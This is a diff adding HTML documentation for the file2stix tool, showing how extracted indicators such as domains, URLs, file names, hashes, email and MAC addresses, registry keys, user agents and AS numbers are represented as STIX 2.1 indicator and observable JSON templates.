+    &quot;object_marking_refs&quot;: [
+        &quot;marking-definition--&lt;TLP LEVEL SET&gt;&quot;
+    ]
+}
+</code></pre>
+<h3 id="stix-21-domain-name-sco">STIX 2.1 domain-name SCO<a class="headerlink" href="#stix-21-domain-name-sco" title="Permanent link">&para;</a></h3>
+<pre><code class="language-json">{
+    &quot;type&quot;: &quot;domain-name&quot;,
+    &quot;spec_version&quot;: &quot;2.1&quot;,
+    &quot;id&quot;: &quot;domain-name--&lt;GENERATED BY STIX2 LIBRARY&gt;&quot;,
+    &quot;value&quot;: &quot;&lt;EXTRACTED DOMAIN NAME VALUE&gt;&quot;,
+    &quot;defanged&quot;: &quot;&lt;DEFANGED BOOLEAN&gt;&quot;
+}
+</code></pre>
+<h2 id="4-url-observables-indicator">4. URL Observables (<code>indicator</code>)<a class="headerlink" href="#4-url-observables-indicator" title="Permanent link">&para;</a></h2>
+<ul>
+<li>e.g. Full path <code>https://example.com/research/index.html</code></li>
+<li>e.g. Partial path <code>https://example.com/research/</code></li>
+</ul>
+<p>Lots of URL extraction logic exists on the internet (<a href="https://github.com/kvesteri/validators/blob/master/validators/url.py">for example</a>). Like with URLs, it is also worth validating protocol and TLDs in the URL path to ensure they are URLs (and not file paths).</p>
+<p>URL Observables are represented by <a href="https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070633">STIX Indicator SDOs (<code>"type": "indicator"</code>)</a>, using the <a href="https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070742">STIX URL SCO (<code>"type": "url"</code>)</a> to create the Indicator SDO <code>pattern</code> property.</p>
+<p>Here is how URL observables are represented in STIX 2.1 by file2stix;</p>
+<h3 id="stix-21-indicator-sdo_5">STIX 2.1 indicator SDO<a class="headerlink" href="#stix-21-indicator-sdo_5" title="Permanent link">&para;</a></h3>
+<pre><code class="language-json">{
+    &quot;type&quot;: &quot;indicator&quot;,
+    &quot;spec_version&quot;: &quot;2.1&quot;,
+    &quot;id&quot;: &quot;indicator--&lt;GENERATED BY STIX2 LIBRARY&gt;&quot;,
+    &quot;created_by_ref&quot;: &quot;identity--&lt;IF TLP RED/AMBER/GREEN USER IDENTITY ID&gt;&quot;,
+    &quot;created&quot;: &quot;&lt;REPORT CREATED PROPERTY VALUE&gt;&quot;,
+    &quot;modified&quot;: &quot;&lt;REPORT MODIFIED PROPERTY VALUE&gt;&quot;,
+    &quot;indicator_types&quot;: [
+        &quot;unknown&quot;,
+        &quot;&lt;IF MATCHES WARNING LIST BENIGN&gt;&quot;
+    ],
+    &quot;confidence&quot;: &quot;&lt;CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN&gt;&quot;,
+    &quot;name&quot;: &quot;URL: &lt;EXTRACTED URL OBSERVABLE VALUE&gt;&quot;,
+    &quot;pattern_type&quot;: &quot;stix&quot;,
+    &quot;pattern&quot;: &quot;[ url:value = '&lt;EXTRACTED URL OBSERVABLE VALUE&gt;' ]&quot;,
+    &quot;valid_from&quot;: &quot;&lt;REPORT CREATED PROPERTY VALUE&gt;&quot;,
+    &quot;object_marking_refs&quot;: [
+        &quot;marking-definition--&lt;TLP LEVEL SET&gt;&quot;
+    ]
+}
+</code></pre>
+<h3 id="stix-21-url-sco">STIX 2.1 url SCO<a class="headerlink" href="#stix-21-url-sco" title="Permanent link">&para;</a></h3>
+<pre><code class="language-json">{  
+    &quot;type&quot;: &quot;url&quot;,
+    &quot;spec_version&quot;: &quot;2.1&quot;,
+    &quot;id&quot;: &quot;url--&lt;GENERATED BY STIX2 LIBRARY&gt;&quot;,
+    &quot;value&quot;: &quot;&lt;EXTRACTED URL VALUE&gt;&quot;,
+    &quot;defanged&quot;: &quot;&lt;DEFANGED BOOLEAN&gt;&quot;
+}
+</code></pre>
+<h2 id="5-file-name-observables-indicator">5. File Name Observables (<code>indicator</code>)<a class="headerlink" href="#5-file-name-observables-indicator" title="Permanent link">&para;</a></h2>
+<p>e.g. <code>badfile.exe</code></p>
+<p>The extraction for file extensions requires some dictionary definitions (because filenames can easily be confused with domains in pattern matching). <a href="https://github.com/cmu-sei/cyobstract/blob/master/etc/file_exts.txt">Here is a comprehensive list of file extensions that can be used</a>.</p>
+<p>File Name Observables are represented by <a href="https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070633">STIX Indicator SDOs (<code>"type": "indicator"</code>)</a>, using the <a href="https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070696">STIX File SCO (<code>"type": "file"</code>)</a> to create the Indicator SDO <code>pattern</code> property.</p>
+<p>Here is how file names are represented in STIX 2.1 by file2stix;</p>
+<h3 id="stix-21-indicator-sdo_6">STIX 2.1 indicator SDO<a class="headerlink" href="#stix-21-indicator-sdo_6" title="Permanent link">&para;</a></h3>
+<pre><code class="language-json">{
+    &quot;type&quot;: &quot;indicator&quot;,
+    &quot;spec_version&quot;: &quot;2.1&quot;,
+    &quot;id&quot;: &quot;indicator--&lt;GENERATED BY STIX2 LIBRARY&gt;&quot;,
+    &quot;created_by_ref&quot;: &quot;identity--&lt;IF TLP RED/AMBER/GREEN USER IDENTITY ID&gt;&quot;,
+    &quot;created&quot;: &quot;&lt;REPORT CREATED PROPERTY VALUE&gt;&quot;,
+    &quot;modified&quot;: &quot;&lt;REPORT MODIFIED PROPERTY VALUE&gt;&quot;,
+    &quot;indicator_types&quot;: [
+        &quot;unknown&quot;,
+        &quot;&lt;IF MATCHES WARNING LIST BENIGN&gt;&quot;
+    ],
+    &quot;confidence&quot;: &quot;&lt;CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN&gt;&quot;,
+    &quot;name&quot;: &quot;File name: &lt;EXTRACTED FILE NAME OBSERVABLE VALUE&gt;&quot;,
+    &quot;pattern_type&quot;: &quot;stix&quot;,
+    &quot;pattern&quot;: &quot;[ file:name = '&lt;EXTRACTED FILE NAME OBSERVABLE VALUE&gt;' ]&quot;,
+    &quot;valid_from&quot;: &quot;&lt;REPORT CREATED PROPERTY VALUE&gt;&quot;,
+    &quot;object_marking_refs&quot;: [
+        &quot;marking-definition--&lt;TLP LEVEL SET&gt;&quot;
+    ]
+}
+</code></pre>
+<h3 id="stix-21-file-sco">STIX 2.1 file SCO<a class="headerlink" href="#stix-21-file-sco" title="Permanent link">&para;</a></h3>
+<pre><code class="language-json">{
+    &quot;type&quot;: &quot;file&quot;,
+    &quot;spec_version&quot;: &quot;2.1&quot;,
+    &quot;id&quot;: &quot;file--&lt;GENERATED BY STIX2 LIBRARY&gt;&quot;,
+    &quot;name&quot;: &quot;&lt;EXTRACTED FILE NAME VALUE&gt;&quot;,
+    &quot;defanged&quot;: &quot;&lt;DEFANGED BOOLEAN&gt;&quot;
+}
+</code></pre>
+<h2 id="6-directory-path-observables-indicator">6. Directory Path Observables (<code>indicator</code>)<a class="headerlink" href="#6-directory-path-observables-indicator" title="Permanent link">&para;</a></h2>
+<ul>
+<li>e.g. Windows Path <code>C:\Windows\System32</code></li>
+<li>e.g. UNIX Path <code>/System/Library/LaunchDaemons</code></li>
+</ul>
+<p>Windows paths start with a drive followed by <code>:\</code> and directories in path are split by <code>\</code>. UNIX Paths start with <code>/</code> and directories in path are split by <code>/</code>.</p>
+<p>Directory Path Observables are represented by <a href="https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070633">STIX Indicator SDOs (<code>"type": "indicator"</code>)</a>, using the <a href="https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070685">STIX Directory SCO (<code>"type": "directory"</code>)</a> to create the Indicator SDO <code>pattern</code> property.</p>
+<p>Here is how directory observables are represented in STIX 2.1 by file2stix;</p>
+<h3 id="stix-21-indicator-sdo_7">STIX 2.1 indicator SDO<a class="headerlink" href="#stix-21-indicator-sdo_7" title="Permanent link">&para;</a></h3>
+<pre><code class="language-json">{
+    &quot;type&quot;: &quot;indicator&quot;,
+    &quot;spec_version&quot;: &quot;2.1&quot;,
+    &quot;id&quot;: &quot;indicator--&lt;GENERATED BY STIX2 LIBRARY&gt;&quot;,
+    &quot;created_by_ref&quot;: &quot;identity--&lt;IF TLP RED/AMBER/GREEN USER IDENTITY ID&gt;&quot;,
+    &quot;created&quot;: &quot;&lt;REPORT CREATED PROPERTY VALUE&gt;&quot;,
+    &quot;modified&quot;: &quot;&lt;REPORT MODIFIED PROPERTY VALUE&gt;&quot;,
+    &quot;indicator_types&quot;: [
+        &quot;unknown&quot;,
+        &quot;&lt;IF MATCHES WARNING LIST BENIGN&gt;&quot;
+    ],
+    &quot;confidence&quot;: &quot;&lt;CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN&gt;&quot;,
+    &quot;name&quot;: &quot;Directory: &lt;EXTRACTED DIRECTORY OBSERVABLE VALUE&gt;&quot;,
+    &quot;pattern_type&quot;: &quot;stix&quot;,
+    &quot;pattern&quot;: &quot;[ directory:path = '&lt;EXTRACTED DIRECTORY OBSERVABLE VALUE&gt;' ]&quot;,
+    &quot;valid_from&quot;: &quot;&lt;REPORT CREATED PROPERTY VALUE&gt;&quot;,
+    &quot;object_marking_refs&quot;: [
+        &quot;marking-definition--&lt;TLP LEVEL SET&gt;&quot;
+    ]
+}
+</code></pre>
+<h3 id="stix-21-directory-sco">STIX 2.1 directory SCO<a class="headerlink" href="#stix-21-directory-sco" title="Permanent link">&para;</a></h3>
+<pre><code class="language-json">{
+    &quot;type&quot;: &quot;directory&quot;,
+    &quot;spec_version&quot;: &quot;2.1&quot;,
+    &quot;id&quot;: &quot;directory--&lt;GENERATED BY STIX2 LIBRARY&gt;&quot;,
+    &quot;path&quot;: &quot;&lt;EXTRACTED DIRECTORY OBSERVABLE VALUE&gt;&quot;
+}
+</code></pre>
+<h2 id="7-file-hashes-indicator">7. File Hashes (<code>indicator</code>)<a class="headerlink" href="#7-file-hashes-indicator" title="Permanent link">&para;</a></h2>
+<ul>
+<li>e.g. md5 <code>79054025255fb1a26e4bc422aef54eb4</code></li>
+<li>e.g. sha1 <code>`86F7E437FAA5A7FCE15D1DDCB9EAEAEA377667B8</code></li>
+<li>e.g. sha256 <code>F4BF9F7FCBEDABA0392F108C59D8F4A38B3838EFB64877380171B54475C2ADE8</code></li>
+<li>e.g. sha512 <code>1f40fc92da241694750979ee6cf582f2d5d7d28e18335de05abc54d0560e0f5302860c652bf08d560252aa5e74210546f369fbbbce8c12cfc7957b2652fe9a75</code></li>
+<li>e.g ssdeep <code>24:Ol9rFBzwjx5ZKvBF+bi8RuM4Pp6rG5Yg+q8wIXhMC:qrFBzKx5s8sM4grq8wIXht</code></li>
+</ul>
+<p>Lots of hash extraction logic exists on the internet (<a href="https://github.com/kvesteri/validators/blob/master/validators/hashes.py">for example</a>).</p>
+<p>These are represented by <a href="https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070633">STIX Indicator SDOs (<code>"type": "indicator"</code>)</a>, using the <a href="https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070696">STIX File SCO (<code>"type": "file"</code>)</a> to create the Indicator SDO <code>pattern</code> property.</p>
+<p>Here is how file hashes are represented in STIX 2.1 by file2stix (note, <code>&lt;FILE HASH TYPE&gt;</code> = either <code>md5</code>, <code>sha1</code>, <code>sha256</code>, <code>ssdeep</code>);</p>
+<h3 id="stix-21-indicator-sdo_8">STIX 2.1 indicator SDO<a class="headerlink" href="#stix-21-indicator-sdo_8" title="Permanent link">&para;</a></h3>
+<pre><code class="language-json">{
+    &quot;type&quot;: &quot;indicator&quot;,
+    &quot;spec_version&quot;: &quot;2.1&quot;,
+    &quot;id&quot;: &quot;indicator--&lt;GENERATED BY STIX2 LIBRARY&gt;&quot;,
+    &quot;created_by_ref&quot;: &quot;identity--&lt;IF TLP RED/AMBER/GREEN USER IDENTITY ID&gt;&quot;,
+    &quot;created&quot;: &quot;&lt;REPORT CREATED PROPERTY VALUE&gt;&quot;,
+    &quot;modified&quot;: &quot;&lt;REPORT MODIFIED PROPERTY VALUE&gt;&quot;,
+    &quot;indicator_types&quot;: [
+        &quot;unknown&quot;,
+        &quot;&lt;IF MATCHES WARNING LIST BENIGN&gt;&quot;
+    ],
+    &quot;confidence&quot;: &quot;&lt;CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN&gt;&quot;,
+    &quot;name&quot;: &quot;&lt;FILE HASH TYPE&gt;: &lt;EXTRACTED FILE HASH OBSERVABLE VALUE&gt;&quot;,
+    &quot;pattern_type&quot;: &quot;stix&quot;,
+    &quot;pattern&quot;: &quot;[ file:hashes.&lt;FILE HASH TYPE&gt; = '&lt;EXTRACTED FILE HASH OBSERVABLE VALUE&gt;' ]&quot;,
+    &quot;valid_from&quot;: &quot;&lt;REPORT CREATED PROPERTY VALUE&gt;&quot;,
+    &quot;object_marking_refs&quot;: [
+        &quot;marking-definition--&lt;TLP LEVEL SET&gt;&quot;
+    ]
+}
+</code></pre>
+<h3 id="stix-21-file-sco_1">STIX 2.1 file SCO<a class="headerlink" href="#stix-21-file-sco_1" title="Permanent link">&para;</a></h3>
+<pre><code class="language-json">{
+    &quot;type&quot;: &quot;file&quot;,
+    &quot;spec_version&quot;: &quot;2.1&quot;,
+    &quot;id&quot;: &quot;file--&lt;GENERATED BY STIX2 LIBRARY&gt;&quot;,
+    &quot;hashes&quot;: {
+        &quot;&lt;FILE HASH TYPE&gt;&quot;: &quot;&lt;EXTRACTED FILE HASH OBSERVABLE VALUE&gt;&quot;
+    }
+}
+</code></pre>
+<h2 id="8-email-address-observables-indicator">8. Email Address Observables (<code>indicator</code>)<a class="headerlink" href="#8-email-address-observables-indicator" title="Permanent link">&para;</a></h2>
+<ul>
+<li>e.g. Full email address <code>example@example.com</code></li>
+</ul>
+<p>Lots of email extraction logic exists on the internet (<a href="https://github.com/kvesteri/validators/blob/master/validators/email.py">for example</a>).  Like with URLs, it is also worth validating TLDs in the email to ensure they are valid.</p>
+<p>Email Address Observables are represented by <a href="https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070633">STIX Indicator SDOs (<code>"type": "indicator"</code>)</a>, using the <a href="https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070690">STIX Email Address SCO (<code>"type": "email-addr"</code>)</a> to create the Indicator SDO <code>pattern</code> property.</p>
+<p>Here is how email address observables are represented in STIX 2.1 by file2stix;</p>
+<h3 id="stix-21-indicator-sdo_9">STIX 2.1 indicator SDO<a class="headerlink" href="#stix-21-indicator-sdo_9" title="Permanent link">&para;</a></h3>
+<pre><code class="language-json">{
+    &quot;type&quot;: &quot;indicator&quot;,
+    &quot;spec_version&quot;: &quot;2.1&quot;,
+    &quot;id&quot;: &quot;indicator--&lt;GENERATED BY STIX2 LIBRARY&gt;&quot;,
+    &quot;created_by_ref&quot;: &quot;identity--&lt;IF TLP RED/AMBER/GREEN USER IDENTITY ID&gt;&quot;,
+    &quot;created&quot;: &quot;&lt;REPORT CREATED PROPERTY VALUE&gt;&quot;,
+    &quot;modified&quot;: &quot;&lt;REPORT MODIFIED PROPERTY VALUE&gt;&quot;,
+    &quot;indicator_types&quot;: [
+        &quot;unknown&quot;,
+        &quot;&lt;IF MATCHES WARNING LIST BENIGN&gt;&quot;
+    ],
+    &quot;confidence&quot;: &quot;&lt;CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN&gt;&quot;,
+    &quot;name&quot;: &quot;Email Address: &lt;EXTRACTED EMAIL ADDRESS OBSERVABLE VALUE&gt;&quot;,
+    &quot;pattern_type&quot;: &quot;stix&quot;,
+    &quot;pattern&quot;: &quot;[ email-addr:value = '&lt;EXTRACTED EMAIL ADDRESS OBSERVABLE VALUE&gt;' ]&quot;,
+    &quot;valid_from&quot;: &quot;&lt;REPORT CREATED PROPERTY VALUE&gt;&quot;,
+    &quot;object_marking_refs&quot;: [
+        &quot;marking-definition--&lt;TLP LEVEL SET&gt;&quot;
+    ]
+}
+</code></pre>
+<h3 id="stix-21-file-sco_2">STIX 2.1 file SCO<a class="headerlink" href="#stix-21-file-sco_2" title="Permanent link">&para;</a></h3>
+<pre><code class="language-json">{
+    &quot;type&quot;: &quot;email-addr&quot;,
+    &quot;spec_version&quot;: &quot;2.1&quot;,
+    &quot;id&quot;: &quot;email-addr--&lt;GENERATED BY STIX2 LIBRARY&gt;&quot;,
+    &quot;value&quot;: &quot;&lt;EXTRACTED EMAIL ADDRESS OBSERVABLE VALUE&gt;&quot;,
+    &quot;defanged&quot;: &quot;&lt;DEFANGED BOOLEAN&gt;&quot;
+}
+</code></pre>
+<h2 id="9-mac-address-observables-indicator">9. MAC Address Observables (<code>indicator</code>)<a class="headerlink" href="#9-mac-address-observables-indicator" title="Permanent link">&para;</a></h2>
+<ul>
+<li>e.g. Full MAC address <code>d2:fb:49:24:37:18</code></li>
+</ul>
+<p>Mac Addresses have six parts, split by <code>:</code>. Lots of MAC address extraction logic exists on the internet (<a href="https://github.com/kvesteri/validators/blob/master/validators/mac_address.py">for example</a>).</p>
+<p>Full MAC addresses are represented by <a href="https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070633">STIX Indicator SDOs (<code>"type": "indicator"</code>)</a>, using the <a href="https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070720">STIX MAC Address SCO (<code>"type": "mac-addr"</code>)</a> to create the Indicator SDO <code>pattern</code> property.</p>
+<p>Here is how MAC Address observables are represented in STIX 2.1 by file2stix;</p>
+<h3 id="stix-21-indicator-sdo_10">STIX 2.1 indicator SDO<a class="headerlink" href="#stix-21-indicator-sdo_10" title="Permanent link">&para;</a></h3>
+<pre><code class="language-json">{
+    &quot;type&quot;: &quot;indicator&quot;,
+    &quot;spec_version&quot;: &quot;2.1&quot;,
+    &quot;id&quot;: &quot;indicator--&lt;GENERATED BY STIX2 LIBRARY&gt;&quot;,
+    &quot;created_by_ref&quot;: &quot;identity--&lt;IF TLP RED/AMBER/GREEN USER IDENTITY ID&gt;&quot;,
+    &quot;created&quot;: &quot;&lt;REPORT CREATED PROPERTY VALUE&gt;&quot;,
+    &quot;modified&quot;: &quot;&lt;REPORT MODIFIED PROPERTY VALUE&gt;&quot;,
+    &quot;indicator_types&quot;: [
+        &quot;unknown&quot;,
+        &quot;&lt;IF MATCHES WARNING LIST BENIGN&gt;&quot;
+    ],
+    &quot;confidence&quot;: &quot;&lt;CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN&gt;&quot;,
+    &quot;name&quot;: &quot;MAC Address: &lt;EXTRACTED MAC ADDRESS OBSERVABLE VALUE&gt;&quot;,
+    &quot;pattern_type&quot;: &quot;stix&quot;,
+    &quot;pattern&quot;: &quot;[ mac-addr:value = '&lt;EXTRACTED MAC ADDRESS OBSERVABLE VALUE&gt;' ]&quot;,
+    &quot;valid_from&quot;: &quot;&lt;REPORT CREATED PROPERTY VALUE&gt;&quot;,
+    &quot;object_marking_refs&quot;: [
+        &quot;marking-definition--&lt;TLP LEVEL SET&gt;&quot;
+    ]
+}
+</code></pre>
+<h3 id="stix-21-mac-addr-sco">STIX 2.1 mac-addr SCO<a class="headerlink" href="#stix-21-mac-addr-sco" title="Permanent link">&para;</a></h3>
+<pre><code class="language-json">{
+    &quot;type&quot;: &quot;mac-addr&quot;,
+    &quot;spec_version&quot;: &quot;2.1&quot;,
+    &quot;id&quot;: &quot;mac-addr--&lt;GENERATED BY STIX2 LIBRARY&gt;&quot;,
+    &quot;value&quot;: &quot;&lt;EXTRACTED MAC ADDRESS OBSERVABLE VALUE&gt;&quot;
+}
+</code></pre>
+<h2 id="10-windows-registry-key-observables-indicator">10. Windows Registry Key Observables (<code>indicator</code>)<a class="headerlink" href="#10-windows-registry-key-observables-indicator" title="Permanent link">&para;</a></h2>
+<ul>
+<li>e.g. Full registry key path <code>HKEY_LOCAL_MACHINE\Software\Classes</code></li>
+</ul>
+<p>There are 5 types of registry key <code>HKEY_CLASSES_ROOT</code>, <code>HKEY_CURRENT_USER</code>, <code>HKEY_LOCAL_MACHINE</code>, <code>HKEY_USERS</code>, <code>HKEY_CURRENT_CONFIG</code>. These are then followed by a directory path with directories separated by <code>\</code>.</p>
+<p>Windows Registry Keys are represented by <a href="https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070633">STIX Indicator SDOs (<code>"type": "indicator"</code>)</a>, using the <a href="https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070748">STIX MAC Address SCO (<code>"type": "windows-registry-key"</code>)</a> to create the Indicator SDO <code>pattern</code> property.</p>
+<p>Here is how Windows Registry Key observables are represented in STIX 2.1 by file2stix;</p>
+<h3 id="stix-21-indicator-sdo_11">STIX 2.1 indicator SDO<a class="headerlink" href="#stix-21-indicator-sdo_11" title="Permanent link">&para;</a></h3>
+<pre><code class="language-json">{
+    &quot;type&quot;: &quot;indicator&quot;,
+    &quot;spec_version&quot;: &quot;2.1&quot;,
+    &quot;id&quot;: &quot;indicator--&lt;GENERATED BY STIX2 LIBRARY&gt;&quot;,
+    &quot;created_by_ref&quot;: &quot;identity--&lt;IF TLP RED/AMBER/GREEN USER IDENTITY ID&gt;&quot;,
+    &quot;created&quot;: &quot;&lt;REPORT CREATED PROPERTY VALUE&gt;&quot;,
+    &quot;modified&quot;: &quot;&lt;REPORT MODIFIED PROPERTY VALUE&gt;&quot;,
+    &quot;indicator_types&quot;: [
+        &quot;unknown&quot;,
+        &quot;&lt;IF MATCHES WARNING LIST BENIGN&gt;&quot;
+    ],
+    &quot;confidence&quot;: &quot;&lt;CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN&gt;&quot;,
+    &quot;name&quot;: &quot;Windows Registry Key: &lt;EXTRACTED WINDOWS REGISTRY KEY OBSERVABLE VALUE&gt;&quot;,
+    &quot;pattern_type&quot;: &quot;stix&quot;,
+    &quot;pattern&quot;: &quot;[ windows-registry-key:key = '&lt;EXTRACTED WINDOWS REGISTRY KEY OBSERVABLE VALUE&gt;' ]&quot;,
+    &quot;valid_from&quot;: &quot;&lt;REPORT CREATED PROPERTY VALUE&gt;&quot;,
+    &quot;object_marking_refs&quot;: [
+        &quot;marking-definition--&lt;TLP LEVEL SET&gt;&quot;
+    ]
+}
+</code></pre>
+<h3 id="stix-21-windows-registry-key-sco">STIX 2.1 windows-registry-key SCO<a class="headerlink" href="#stix-21-windows-registry-key-sco" title="Permanent link">&para;</a></h3>
+<pre><code class="language-json">{
+    &quot;type&quot;: &quot;windows-registry-key&quot;,
+    &quot;spec_version&quot;: &quot;2.1&quot;,
+    &quot;id&quot;: &quot;windows-registry-key--&lt;GENERATED BY STIX2 LIBRARY&gt;&quot;,
+    &quot;key&quot;: &quot;&lt;EXTRACTED WINDOWS REGISTRY KEY OBSERVABLE VALUE&gt;&quot;
+}
+</code></pre>
+<h2 id="11-user-agent-observables-indicator">11. User Agent Observables (<code>indicator</code>)<a class="headerlink" href="#11-user-agent-observables-indicator" title="Permanent link">&para;</a></h2>
+<ul>
+<li>e.g Full user agent <code>Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.6) Gecko/20040113</code>)</li>
+</ul>
+<p>User Agents should follow <a href="https://www.rfc-editor.org/rfc/rfc7231#section-5.5.3">RFC7231</a>. There are a <a href="https://regex101.com/r/nXKYBB/3">few example regular expressions on the internet to extract user agent patterns</a>.</p>
+<p>User Agents are represented by <a href="https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070633">STIX Indicator SDOs (<code>"type": "indicator"</code>)</a>, using the <a href="https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070724">STIX Network Traffic SCO (<code>"type": "network-traffic"</code>)</a> to create the Indicator SDO <code>pattern</code> property.</p>
+<p>Here is how User Agent observables are represented in STIX 2.1 by file2stix;</p>
+<h3 id="stix-21-extension-definition">STIX 2.1 extension-definition<a class="headerlink" href="#stix-21-extension-definition" title="Permanent link">&para;</a></h3>
+<p>As STIX 2.1 does not natively have an extension for user agents file2stix uses a custom SCO;</p>
+<p>https://github.com/signalscorps/stix2-objects/blob/main/extension-definition/new-sco/user-agent/extension-definition--6cea4dc9-9517-44b8-b021-ae82e2f1de43/20220101000000000.json</p>
+<h3 id="stix-21-user-agent-sco">STIX 2.1 user-agent SCO<a class="headerlink" href="#stix-21-user-agent-sco" title="Permanent link">&para;</a></h3>
+<pre><code class="language-json">{
+    &quot;type&quot;: &quot;user-agent&quot;,
+    &quot;spec_version&quot;: &quot;2.1&quot;,
+    &quot;id&quot;: &quot;user-agent--&lt;GENERATED BY STIX2 LIBRARY&gt;&quot;,
+    &quot;string&quot;: &quot;&lt;EXTRACTED FULL USER AGENT STRING&gt;&quot;,
+    &quot;extensions&quot;: {
+        &quot;extension-definition--6cea4dc9-9517-44b8-b021-ae82e2f1de43&quot; : {
+            &quot;extension_type&quot; : &quot;new-sco&quot;
+        }
+    }
+}
+</code></pre>
+<h3 id="stix-21-indicator-sdo_12">STIX 2.1 indicator SDO<a class="headerlink" href="#stix-21-indicator-sdo_12" title="Permanent link">&para;</a></h3>
+<pre><code class="language-json">{
+    &quot;type&quot;: &quot;indicator&quot;,
+    &quot;spec_version&quot;: &quot;2.1&quot;,
+    &quot;id&quot;: &quot;indicator--&lt;GENERATED BY STIX2 LIBRARY&gt;&quot;,
+    &quot;created_by_ref&quot;: &quot;identity--&lt;IF TLP RED/AMBER/GREEN USER IDENTITY ID&gt;&quot;,
+    &quot;created&quot;: &quot;&lt;REPORT CREATED PROPERTY VALUE&gt;&quot;,
+    &quot;modified&quot;: &quot;&lt;REPORT MODIFIED PROPERTY VALUE&gt;&quot;,
+    &quot;indicator_types&quot;: [
+        &quot;unknown&quot;,
+        &quot;&lt;IF MATCHES WARNING LIST BENIGN&gt;&quot;
+    ],
+    &quot;confidence&quot;: &quot;&lt;CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN&gt;&quot;,
+    &quot;name&quot;: &quot;User Agent: &lt;EXTRACTED FULL USER AGENT STRING&gt;&quot;,
+    &quot;pattern_type&quot;: &quot;stix&quot;,
+    &quot;pattern&quot;: &quot;[ user-agent:string = '&lt;EXTRACTED FULL USER AGENT STRING&gt;' ]&quot;,
+    &quot;valid_from&quot;: &quot;&lt;REPORT CREATED PROPERTY VALUE&gt;&quot;,
+    &quot;object_marking_refs&quot;: [
+        &quot;marking-definition--&lt;TLP LEVEL SET&gt;&quot;
+    ]
+}
+</code></pre>
+<h2 id="12-autonomous-system-number-observables-indicator">12. Autonomous System Number Observables (<code>indicator</code>)<a class="headerlink" href="#12-autonomous-system-number-observables-indicator" title="Permanent link">&para;</a></h2>
+<p>Including:</p>
+<ul>
+<li>e.g. ASN Number format <code>ASN15139</code> / <code>ASN 15139</code></li>
+<li>e.g. AS Number format <code>AS15139</code> / <code>AS 15139</code></li>
+</ul>
+<p>ASN numbers start with either ASN or AS and are followed by 5 digits. Occasionally some people write ASN numbers with a white space value between the text and digits.</p>
+<p>ASNs are represented by <a href="https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070633">STIX Indicator SDOs (<code>"type": "indicator"</code>)</a>, using the <a href="https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070683">STIX AS Object SCO (<code>"type": "autonomous-system"</code>)</a> to create the Indicator SDO <code>pattern</code> property.</p>
+<p>Here is how AS observables are represented in STIX 2.1 by file2stix;</p>
+<h3 id="stix-21-indicator-sdo_13">STIX 2.1 indicator SDO<a class="headerlink" href="#stix-21-indicator-sdo_13" title="Permanent link">&para;</a></h3>
+<pre><code class="language-json">{
+    &quot;type&quot;: &quot;indicator&quot;,
+    &quot;spec_version&quot;: &quot;2.1&quot;,
+    &quot;id&quot;: &quot;indicator--&lt;GENERATED BY STIX2 LIBRARY&gt;&quot;,
+    &quot;created_by_ref&quot;: &quot;identity--&lt;IF TLP RED/AMBER/GREEN USER IDENTITY ID&gt;&quot;,
+    &quot;created&quot;: &quot;&lt;REPORT CREATED PROPERTY VALUE&gt;&quot;,
+    &quot;modified&quot;: &quot;&lt;REPORT MODIFIED PROPERTY VALUE&gt;&quot;,
+    &quot;indicator_types&quot;: [
+        &quot;unknown&quot;,
+        &quot;&lt;IF MATCHES WARNING LIST BENIGN&gt;&quot;
+    ],
+    &quot;confidence&quot;: &quot;&lt;CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN&gt;&quot;,
+    &quot;name&quot;: &quot;AS&lt;EXTRACTED NUMERICAL AS OBSERVABLE VALUE&gt;&quot;,
+    &quot;pattern_type&quot;: &quot;stix&quot;,
+    &quot;pattern&quot;: &quot;[ autonomous-system:number = '&lt;EXTRACTED NUMERICAL AS OBSERVABLE VALUE&gt;' ]&quot;,
+    &quot;valid_from&quot;: &quot;&lt;REPORT CREATED PROPERTY VALUE&gt;&quot;,
+    &quot;object_marking_refs&quot;: [
+        &quot;marking-definition--&lt;TLP LEVEL SET&gt;&quot;
+    ]
+}
+</code></pre>
+<h3 id="stix-21-autonomous-system-sco">STIX 2.1 autonomous-system SCO<a class="headerlink" href="#stix-21-autonomous-system-sco" title="Permanent link">&para;</a></h3>
+<pre><code class="language-json">{
+    &quot;type&quot;: &quot;autonomous-system&quot;,
+    &quot;spec_version&quot;: &quot;2.1&quot;,
